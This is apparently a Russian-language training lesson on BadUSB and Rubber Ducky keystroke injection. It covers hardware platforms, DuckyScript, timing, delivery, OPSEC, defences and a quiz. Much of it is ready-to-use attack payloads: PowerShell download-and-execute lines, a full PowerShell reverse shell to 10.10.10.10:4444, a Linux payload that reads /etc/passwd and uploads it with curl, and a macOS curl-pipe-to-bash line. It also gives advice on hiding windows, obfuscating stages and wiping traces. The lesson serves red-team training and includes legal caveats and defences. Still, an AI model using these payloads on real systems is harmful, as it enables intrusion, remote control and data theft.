---
id: hardware-rubber-ducky
title: "BadUSB и Rubber Ducky"
category: hardware
parent: hardware-mod-usb-offensive
difficulty: medium
order: 1
tags: [badusb, rubberducky, hid, usb]
prerequisites: [hardware-usb-hid, hardware-usb]
useful_for:
  - "Red team: физические импланты"
  - "Пентест рабочих мест"
  - "CTF Hardware"
estimated_minutes: 65
summary: "Инженерная сторона HID-инъекции: DuckyScript 1.0/3.0, Payload Studio, платформы (Rubber Ducky, Digispark, Flipper, MalDuino), оптимизация таймингов, доставка payload и OPSEC, а также защита от BadUSB."
---

Этот урок — практическая инженерия **BadUSB**. Если базовый урок (`hardware-usb-hid`) объясняет, что такое HID-инъекция, то здесь мы разбираем, как **собрать работающий payload**, подобрать тайминги под целевую ОС, обойти простые защиты и не спалиться. HID-инъекция проста в идее и коварна в деталях: один неверный `DELAY` — и команда печатается в пустоту.

## Напоминание: почему это работает

Устройство объявляет себя через **USB-дескрипторы** как HID-клавиатуру. ОС доверяет классу устройства, а не личности. HID-отчёт — 8 байт: модификаторы, reserved, до 6 одновременных кодов клавиш. Инъекция = поток таких отчётов с огромной скоростью. Никакого драйвера, никаких уязвимостей — только доверие к дескриптору.

## Платформы: сравнение

| Платформа | Язык | Плюсы | Минусы |
|-----------|------|-------|--------|
| Rubber Ducky (Hak5) | DuckyScript 3.0 | эталон, Payload Studio, хранение нескольких payload'ов | цена, заметная «флешка» |
| Digispark ATtiny85 | Arduino C / DuckyScript | дёшево, мал | ограниченная память, тайминги |
| MalDuino | Arduino | open-source | устарела |
| Flipper Zero | DuckyScript + BadUSB | многофункциональна | крупная, распознаваема |
| O.MG Cable | встроенный | неотличим от кабеля | цена |
| Bash Bunny (Hak5) | bash + HID | несколько режимов | крупнее Ducky |

Для обучения удобнее всего **Digispark** (дёшево) и **Flipper** (гибко). Для реалистичного red-team — **O.MG Cable** или **Rubber Ducky**.

## DuckyScript 1.0 vs 3.0

DuckyScript 1.0 — линейный список команд. 3.0 добавляет **переменные, условия, функции, обработку отчётов клавиатуры**:

```duckyscript
REM Заголовок payload'а
DEFINE DELAY_OS 2000

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "iwr http://10.10.10.10/a.ps1 -o $env:TEMP\a.ps1; & $env:TEMP\a.ps1"
ENTER
```

DuckyScript 3.0 с условием:

```duckyscript
REM Проверка: если пользователь — admin
IF ($_OS == "WIN")
    GUI r
    DELAY 500
    STRING cmd
    ENTER
END_IF
```

| Команда | 1.0 | 3.0 | Смысл |
|---------|-----|-----|-------|
| `STRING` | да | да | набрать текст |
| `DELAY` | да | да | пауза |
| `DEFAULT_DELAY` | да | да | глобальная задержка |
| `REPEAT` | да | да | повтор |
| `DEFINE` | нет | да | переменная/константа |
| `IF/ELSE/END_IF` | нет | да | ветвление |
| `FUNCTION/END_FUNCTION` | нет | да | подпрограмма |
| `VAR` | нет | да | переменная |
| `WHILE/END_WHILE` | нет | да | цикл |
| `RETURN` | нет | да | возврат |

## Payload Studio и компиляция

**Payload Studio** (Hak5, онлайн/десктоп) компилирует DuckyScript в `inject.bin` для Rubber Ducky, подсвечивает синтаксис, проверяет тайминги.

```bash
# DuckEncoder (legacy) — компиляция в бинарный payload
java -jar duckencoder.jar -i payload.txt -o inject.bin -l us
# Заливка на Ducky (микро-SD)
cp inject.bin /media/$USER/DUCKY/
```

Для Digispark — Arduino IDE:

```bash
# Установить DigiKeyboard
# Файл -> Примеры -> DigiKeyboard -> DigiKeyboard
# Вставить свой скетч, выбрать плату "Digispark (Default - 16.5mhz)", Upload
```

Пример скетча Digispark:

```cpp
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   // Win+R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w hidden -c \"iwr http://10.10.10.10/a.ps1|iex\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
```

## Тайминги: главная тонкость

Тайминги определяют, попадёт ли ввод в нужное окно. Правила:

- **Загрузка ОС**: на SSD ~5–10 с, на HDD ~20–40 с. `DELAY 10000` для первого окна.
- **Окно «Выполнить»**: `GUI r` открывается за 200–500 мс.
- **PowerShell**: холодный старт до 2–3 с.
- **Медленные машины**: используйте `DEFAULT_DELAY 50`, чтобы не терять символы.
- **Раскладка**: `STRING` шлёт коды клавиш, а не символы — русская раскладка сломает ASCII-пути.

```duckyscript
DEFAULT_DELAY 40
DELAY 8000
GUI r
DELAY 800
STRING cmd /c "whoami > C:\Users\Public\out.txt"
ENTER
```

## Доставка payload и OPSEC

- **Физический доступ**: подменить кабель/флешку, «забыть» устройство.
- **Социальная инженерия**: подбросить как «найденную флешку» (но современные ОС требуют подтверждения).
- **OPSEC**: не оставлять артефактов — `-w hidden`, удалять скрипты, чистить `$env:TEMP`.
- **C2**: payload скачивает вторую стадию; первая стадия минимальна и скрытна.
- **Отпечатки**: O.MG Cable оставляет в системе USB-дескрипторы; аналитики ищут аномалии HID.
- **Юридически**: несанкционированное использование — уголовно наказуемо; только в рамках red-team-контракта.

## Обход простых защит

- **Блокировка автозапуска** не мешает HID — ввод идёт как клавиатура.
- **Windows Defender**: обфусцируйте первую стадию (Base64, AMSI bypass — только в лаборатории).
- **Экран блокировки**: payload может работать до входа в систему, если открыть cmd через специальные возможности (старая техника, часто закрыта патчами).
- **Антивирус HID**: некоторые EDR ловят аномально быстрый ввод (keystroke timing detection).
- **USB-фильтры**: whitelist по VID/PID/классу — обходится подменой дескрипторов (см. FaceDancer).

## Разобранный пример: сборка payload'а от начала до конца

```bash
# 1. Пишем payload
cat > payload.txt <<'EOF'
DELAY 8000
GUI r
DELAY 800
STRING powershell -w hidden -nop -ep bypass -c "iwr http://10.10.10.10/s.ps1|iex"
ENTER
EOF
# 2. Компилируем для Rubber Ducky
java -jar duckencoder.jar -i payload.txt -o inject.bin
# 3. Заливаем на устройство
cp inject.bin /media/$USER/DUCKY/
# 4. Тестируем на своей виртуалке, замеряем тайминги по видео
```

Ожидаемый результат в логах на «жертве» (лаборатория):

```text
# На сервере 10.10.10.10 видим HTTP-запрос
10.10.10.10 - - [..] "GET /s.ps1 HTTP/1.1" 200 -
# На цели появляется соединение C2
```

## Edge cases и подводные камни

- **Раскладка**: `STRING` под русской раскладкой печатает не то — переключите или используйте коды.
- **Caps Lock / Num Lock**: модификаторы меняют результат; проверяйте состояние.
- **UAC-окно**: PowerShell от имени пользователя не даёт admin; нужен обход или согласие.
- **Экран блокировки**: не всякий payload туда дотянется.
- **Медленный USB-хаб**: теряются отчёты — увеличьте `DEFAULT_DELAY`.
- **VM**: на виртуалке USB-проброс может «тормозить» — тестируйте на «железе».
- **Двойной ввод**: самоблокировка клавиш при слишком быстром потоке.

## Ссылочные таблицы

| Спецклавиша | DuckyScript |
|-------------|-------------|
| Win+R | `GUI r` |
| Ctrl+Shift+Esc | `CTRL SHIFT ESC` |
| Alt+F4 | `ALT F4` |
| Enter | `ENTER` |
| Tab | `TAB` |
| Win | `GUI` |

| Защита | Эффективность против BadUSB |
|--------|------------------------------|
| Отключение автозапуска | нет |
| USB-порт whitelist (класс) | частично |
| EDR с детекцией HID-тайминга | да |
| Физическая блокировка портов | да |
| Обучение пользователей | частично |

## Что дальше / решение

- Нужна эмуляция произвольных устройств → `hardware-facedancer`.
- Нужны атаки на питание USB-C → `hardware-usbc-pd`.
- Базовый HID → `hardware-usb-hid`.
- Эксплуатация USB-стека хоста → `hardware-usb-device-exploit`.

## Полезные payload-паттерны

Проверенные конструкции для разных задач (только в лаборатории и в рамках контракта):

**Реверс-шелл одной строкой (Windows)**:

```duckyscript
DELAY 8000
GUI r
DELAY 800
STRING powershell -w hidden -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}"
ENTER
```

**Сбор данных (Linux)**:

```duckyscript
DELAY 6000
CTRL ALT t
DELAY 1000
STRING bash -c 'id; uname -a; cat /etc/passwd; ls -la ~' > /tmp/.out 2>&1; curl -s -F f=@/tmp/.out http://10.10.10.10/u
ENTER
```

**macOS** (Terminal через Spotlight):

```duckyscript
DELAY 5000
GUI SPACE
DELAY 800
STRING terminal
ENTER
DELAY 1500
STRING curl -s http://10.10.10.10/m.sh | bash
ENTER
```

| ОС | Как открыть терминал | Особенность |
|----|---------------------|-------------|
| Windows | `GUI r` → cmd/powershell | UAC мешает admin |
| Linux | `CTRL ALT t` | зависит от DE |
| macOS | `GUI SPACE` → terminal | Spotlight может «думать» |

## Скрытность и очистка следов

- **Скрытые окна**: PowerShell `-w hidden`, `-nop`, `-ep bypass`.
- **Обфускация**: Base64 для первой стадии (`-enc <base64>`), чтобы не светить строки.
- **Очистка**: удалять скачанные файлы, чистить историю PowerShell и `$env:TEMP`.
- **Две стадии**: первый payload минимален, всё остальное тянется с C2.
- **Смена поведения**: не запускать разрушительные действия — только разведка/доступ.
- **Логи**: помните, что HID-инъекция может оставлять события в EDR и журналах процессов.

## Тестирование и замер таймингов

Тайминги настраиваются эмпирически. Практический метод:

```text
1. Снять видео экрана (телефон/ОБС) при подключении Ducky.
2. Запустить payload.
3. Посмотреть, в какой момент какой ввод появляется.
4. Скорректировать DELAY/DEFAULT_DELAY.
5. Повторить до стабильного результата.
```

Дополнительно:

- Используйте `DEFAULT_DELAY 30-60` как базу.
- Для холодного старта Windows — `DELAY 8000-15000`.
- Для macOS — `DELAY 5000-8000` (быстрее).
- Для Linux с лёгким DE — `DELAY 6000`.
- На виртуалке добавляйте запас: USB-проброс тормозит.

## Ссылочные таблицы

| Модификатор | DuckyScript | Скан-код (HID) |
|-------------|-------------|----------------|
| Left Ctrl | `CTRL` | 0x01 |
| Left Shift | `SHIFT` | 0x02 |
| Left Alt | `ALT` | 0x04 |
| Left GUI | `GUI` | 0x08 |
| Right Ctrl | `RCTRL` | 0x10 |
| Right GUI | `RGUI` | 0x80 |

| Фаза | Типичная задержка |
|------|-------------------|
| Пост-загрузка ОС | 5000–15000 мс |
| Открытие Run/Spotlight | 500–1500 мс |
| Запуск shell | 800–3000 мс |
| Ввод команды | `DEFAULT_DELAY 30–60` |

## Этические и правовые границы

BadUSB — это, по сути, выдача себя за клавиатуру. Использование без разрешения владельца системы — несанкционированный доступ (статьи УК о неправомерном доступе к компьютерной информации). Допустимо только:

- на собственном оборудовании в изолированной лаборатории;
- в рамках red-team-контракта с письменным scope;
- в CTF-соревнованиях на специально выделенных стендах.

Любая «проверка» на чужом рабочем месте без договора — уголовно наказуемое деяние.

## Квиз

```quiz
- question: "Чем DuckyScript 3.0 отличается от 1.0?"
  options:
    - "Только скоростью"
    - "Поддержкой переменных, условий, функций и циклов"
    - "Работает без USB"
    - "Требует драйвер"
  answer: 1
  explanation: "3.0 добавляет DEFINE/IF/FUNCTION/WHILE."
- question: "Почему на русской раскладке STRING может сломаться?"
  options:
    - "STRING шлёт коды клавиш, а не символы"
    - "Русские буквы запрещены"
    - "Нужен другой кабель"
    - "Раскладка не влияет"
  answer: 0
  explanation: "HID-отчёты — это скан-коды, зависящие от раскладки."
- question: "Что компилирует Payload Studio?"
  options:
    - "Python в exe"
    - "DuckyScript в inject.bin"
    - "PNG в JPEG"
    - "PDF в текст"
  answer: 1
  explanation: "Payload Studio собирает inject.bin для Rubber Ducky."
- question: "Какая защита реально мешает BadUSB?"
  options:
    - "Отключение автозапуска"
    - "EDR с детекцией аномального HID-тайминга или физическая блокировка портов"
    - "Антивирус с сигнатурами"
    - "Смена пароля"
  answer: 1
  explanation: "Автозапуск тут ни при чём; помогает детекция HID или блокировка портов."
- question: "Зачем нужен DEFAULT_DELAY?"
  options:
    - "Чтобы payload был короче"
    - "Чтобы избежать потери символов на медленном хосте"
    - "Чтобы зарядить устройство"
    - "Чтобы сменить язык"
  answer: 1
  explanation: "Глобальная задержка снижает потерю ввода."
```

## Где пригодится

- **Red team:** физические импланты и доступ к рабочим местам.
- **Пентест:** оценка контроля USB-портов и EDR.
- **CTF:** категория Hardware — HID-инъекция.
- **Работа:** проектирование политик блокировки USB и детекций.
- **Дальше по дереву:** `hardware-facedancer`, `hardware-usbc-pd`.
